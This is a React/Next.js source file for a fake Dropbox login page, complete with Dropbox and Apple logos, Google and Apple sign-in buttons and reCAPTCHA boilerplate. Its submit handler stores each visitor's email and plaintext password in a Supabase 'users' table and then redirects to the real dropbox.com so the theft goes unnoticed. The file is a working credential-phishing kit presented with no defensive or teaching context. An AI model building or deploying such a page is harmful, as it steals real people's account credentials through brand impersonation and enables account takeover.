"use client"; // This directive is still correct and necessary.

import React, { useState } from 'react';
// Reverted to the standard package import. This is the correct way.
import { createClient } from '@supabase/supabase-js';

// --- Supabase Setup ---
// Make sure your .env.local file with these variables is in the project root.
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

// --- Supabase Client Initialization ---
// We'll add a check to ensure the variables are loaded before creating the client.
let supabase;
if (supabaseUrl && supabaseAnonKey) {
  supabase = createClient(supabaseUrl, supabaseAnonKey);
} else {
  console.error("Supabase URL or Anon Key is missing. Make sure to set them in .env.local");
}


// --- SVG Components ---
const DropboxLogo = () => (
    <svg viewBox="0 0 38 38" fill="none" className="w-10 h-10 text-blue-600">
        <path d="M12.25 6.33331L6.33337 10.2083L12.25 14.0833L19 10.2083L12.25 6.33331Z" fill="currentColor"></path>
        <path d="M6.33337 16.0208L12.25 19.8958L19 16.0208L12.25 12.1458L6.33337 16.0208Z" fill="currentColor"></path>
        <path d="M25.6666 10.2083L19 6.33331L12.25 10.2083L19 14.0833L25.6666 10.2083Z" fill="currentColor"></path>
        <path d="M19 16.0208L25.6666 12.1458L31.6666 16.0208L25.6666 19.8958L19 16.0208Z" fill="currentColor"></path>
        <path d="M12.25 21.8333L19 25.7083L25.6666 21.8333L19 17.9583L12.25 21.8333Z" fill="currentColor"></path>
    </svg>
);

const AppleLogo = () => (
    <svg className="w-5 h-5 mr-3" viewBox="0 0 24 24" fill="currentColor">
        <path d="M14.227 21.3h-4.455a2.43 2.43 0 0 1-1.12-.248c-.432-.192-.81-.48-1.134-.864-.684-.816-1.116-1.884-1.296-3.216-.108-.816.096-1.644.504-2.484.408-.828 1.044-1.536 1.908-2.124.864-.588 1.812-.876 2.844-.876.384 0 .756.048 1.116.144.36.084.684.156.972.216.204-.048.42-.084.648-.108.3-.036.6-.048.9-.048.924 0 1.8.288 2.628.876.828.588 1.428 1.296 1.788 2.124a3.3 3.3 0 0 1 .156 3.324c-.3.876-.804 1.608-1.512 2.196-.708.576-1.512.864-2.412.864zm-3.34-18.396c.864-.984 2.22-1.536 3.588-1.536.156 0 .312.012.468.024.156.012.312.036.468.072.156.036.3.084.444.144.144.06.276.132.408.216l.132.096c-.492.288-.936.66-1.332 1.104-.396.444-.696.948-.9 1.512-.18.564-.264 1.14-.252 1.728.012.588.132 1.164.36 1.728.228.564.552 1.08.972 1.548.42.468.912.864 1.476 1.188l.156.084c.036.024.06.036.096.06.024.012.048.036.072.048.012 0 .024.012.036.012-.132.06-.276.108-.42.156-.144.048-.288.084-.444.12-.156.036-.312.06-.468.084-.156.024-.312.036-.468.036-1.428 0-2.784-.552-3.744-1.656-.96-.1.104-2.16-1.656-3.12-1.536z"></path>
    </svg>
);


// --- Main Login Component ---
const DropboxLogin = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState({ type: '', content: '' });

    const handleLogin = async (e) => {
        e.preventDefault();
        
        if (!supabase) {
            setMessage({ type: 'error', content: 'Supabase client is not initialized. Check your .env.local file.' });
            return;
        }

        setLoading(true);
        setMessage({ type: '', content: '' });

        try {
            // IMPORTANT: This now inserts data into a table named 'users'.
            // Ensure you have a 'users' table in your Supabase project
            // with 'email' and 'password' columns (both of type 'text').
            const { error } = await supabase
                .from('users')
                .insert([{ email: email, password: password }]);

            if (error) {
                setMessage({ type: 'error', content: `Database error: ${error.message}` });
            } else {
                setMessage({ type: 'success', content: 'Data saved! Redirecting...' });
                // Redirect after successfully saving the data.
                window.location.href = 'https://www.dropbox.com';
            }
        } catch (err) {
            setMessage({ type: 'error', content: 'An unexpected error occurred.' });
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="bg-gray-100 flex flex-col min-h-screen font-sans">
            <header className="p-4 sm:p-6">
                <a href="#" title="Dropbox">
                    <DropboxLogo />
                </a>
            </header>

            <main className="flex-grow flex items-start justify-center py-8 sm:py-12 px-4">
                <div className="w-full max-w-md">
                    <div className="bg-white border border-gray-200 rounded-lg shadow-sm p-8">
                        <h1 className="text-3xl font-bold text-gray-900 mb-4">Log in</h1>
                        <p className="text-gray-600 mb-6">
                            or <a href="#" className="text-blue-600 hover:underline font-medium">create an account</a>
                        </p>

                        {/* Social Logins (Functionality not implemented) */}
                        <div className="space-y-3 mb-6">
                            <button className="w-full flex items-center justify-center px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200">
                                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" className="w-5 h-5 mr-3" />
                                <span className="font-medium text-gray-700">Continue with Google</span>
                            </button>
                            <button className="w-full flex items-center justify-center px-4 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors duration-200">
                                <AppleLogo />
                                <span className="font-medium text-gray-700">Continue with Apple</span>
                            </button>
                        </div>

                        <div className="flex items-center my-6">
                            <div className="flex-grow border-t border-gray-300"></div>
                            <span className="flex-shrink mx-4 text-gray-500 font-medium">or</span>
                            <div className="flex-grow border-t border-gray-300"></div>
                        </div>

                        {/* Login Form */}
                        <form onSubmit={handleLogin}>
                            {message.content && (
                                <p className={`text-sm mb-4 text-center ${message.type === 'error' ? 'text-red-500' : 'text-green-500'}`}>
                                    {message.content}
                                </p>
                            )}
                            <div className="space-y-5">
                                <div>
                                    <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">Email</label>
                                    <input 
                                        type="email" name="email" id="email" required 
                                        className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-1 focus:ring-blue-500 focus:border-blue-500 transition text-black" 
                                        placeholder="Enter your email"
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        disabled={loading}
                                    />
                                </div>

                                <div>
                                    <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">Password</label>
                                    <input 
                                        type="password" name="password" id="password" required 
                                        className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-1 focus:ring-blue-500 focus:border-blue-500 transition text-black" 
                                        placeholder="Enter your password"
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        disabled={loading}
                                    />
                                </div>

                                <div className="flex items-center justify-between">
                                    <div className="flex items-center">
                                        <input id="remember-me" name="remember-me" type="checkbox" className="h-4 w-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                                        <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-900">Remember me</label>
                                    </div>
                                    <div className="text-sm">
                                        <a href="#" className="font-medium text-blue-600 hover:underline">Forgot your password?</a>
                                    </div>
                                </div>

                                <div>
                                    <button 
                                        type="submit" 
                                        className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors duration-200 disabled:bg-blue-400 disabled:cursor-not-allowed"
                                        disabled={loading}
                                    >
                                        {loading ? 'Saving...' : 'Log in'}
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    
                    <div className="mt-6 text-center text-xs text-gray-500">
                        <p>This page is protected by reCAPTCHA and the Google <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a> and <a href="#" className="text-blue-600 hover:underline">Terms of Service</a> apply.</p>
                    </div>
                </div> 
            </main>
            
            <footer className="bg-gray-100 py-4 px-4 sm:px-6">
                <div className="max-w-md mx-auto flex justify-between items-center">
                    <div className="relative">
                        <select className="appearance-none bg-transparent text-sm text-gray-600 hover:text-gray-800 pr-8 cursor-pointer focus:outline-none">
                            <option value="en-us">English (United States)</option>
                            <option value="es">Español</option>
                            <option value="fr">Français</option>
                            <option value="de">Deutsch</option>
                        </select>
                        <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
                           <svg className="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z"/></svg>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    );
};

export default function App() {
  return (
    <>
      <style jsx global>{`
        body {
          font-family: 'Inter', sans-serif;
        }
      `}</style>
      <DropboxLogin />
    </>
  );
}
